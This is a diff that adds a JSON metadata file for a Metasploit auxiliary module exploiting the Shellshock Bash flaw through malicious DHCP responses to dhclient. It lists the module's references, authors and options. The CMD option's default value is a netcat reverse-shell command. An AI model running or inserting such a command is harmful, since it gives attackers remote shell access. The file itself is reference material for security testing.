@@ -1,0 +1,180 @@
+{
+  "name": "DHCP Client Bash Environment Variable Code Injection (Shellshock)",
+  "fullname": "auxiliary/server/dhclient_bash_env",
+  "aliases": [
+
+  ],
+  "rank": 300,
+  "disclosure_date": "2014-09-24",
+  "type": "auxiliary",
+  "author": [
+    "scriptjunkie",
+    "apconole <apconole@yahoo.com>",
+    "Stephane Chazelas",
+    "Ramon de C Valle <rcvalle@metasploit.com>"
+  ],
+  "description": "This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets dhclient by responding\n        to DHCP requests with a malicious hostname, domainname, and URL which are then\n        passed to the configuration scripts as environment variables, resulting in code\n        execution.",
+  "references": [
+    "https://cvedetails.com/cve/CVE-2014-6271/",
+    "https://cwe.mitre.org/data/definitions/94.html",
+    "OSVDB (112004)",
+    "https://www.exploit-db.com/exploits/34765",
+    "https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/",
+    "https://seclists.org/oss-sec/2014/q3/649",
+    "https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/"
+  ],
+  "platform": "",
+  "arch": "",
+  "autofilter_ports": [
+
+  ],
+  "autofilter_services": [
+
+  ],
+  "targets": null,
+  "path": "/modules/auxiliary/server/dhclient_bash_env.rb",
+  "ref_name": "server/dhclient_bash_env",
+  "check": false,
+  "post_auth": false,
+  "default_credential": false,
+  "notes": {
+    "AKA": [
+      "Shellshock"
+    ]
+  },
+  "needs_cleanup": null,
+  "options": [
+    {
+      "type": "string",
+      "name": "WORKSPACE",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": true,
+      "description": "Specify the workspace for this module"
+    },
+    {
+      "type": "bool",
+      "name": "VERBOSE",
+      "required": false,
+      "default": false,
+      "aliases": [
+
+      ],
+      "advanced": true,
+      "description": "Enable detailed status messages"
+    },
+    {
+      "type": "string",
+      "name": "SRVHOST",
+      "required": true,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The IP of the DHCP server"
+    },
+    {
+      "type": "string",
+      "name": "NETMASK",
+      "required": true,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The netmask of the local subnet"
+    },
+    {
+      "type": "string",
+      "name": "DHCPIPSTART",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The first IP to give out"
+    },
+    {
+      "type": "string",
+      "name": "DHCPIPEND",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The last IP to give out"
+    },
+    {
+      "type": "string",
+      "name": "ROUTER",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The router IP address"
+    },
+    {
+      "type": "string",
+      "name": "BROADCAST",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The broadcast address to send to"
+    },
+    {
+      "type": "string",
+      "name": "DNSSERVER",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The DNS server IP address"
+    },
+    {
+      "type": "string",
+      "name": "HOSTSTART",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The optional host integer counter"
+    },
+    {
+      "type": "string",
+      "name": "FILENAME",
+      "required": false,
+      "default": null,
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The optional filename of a tftp boot server"
+    },
+    {
+      "type": "string",
+      "name": "CMD",
+      "required": true,
+      "default": "/bin/nc -e /bin/sh 127.0.0.1 4444",
+      "aliases": [
+
+      ],
+      "advanced": false,
+      "description": "The command to run"
+    }
+  ]
+}
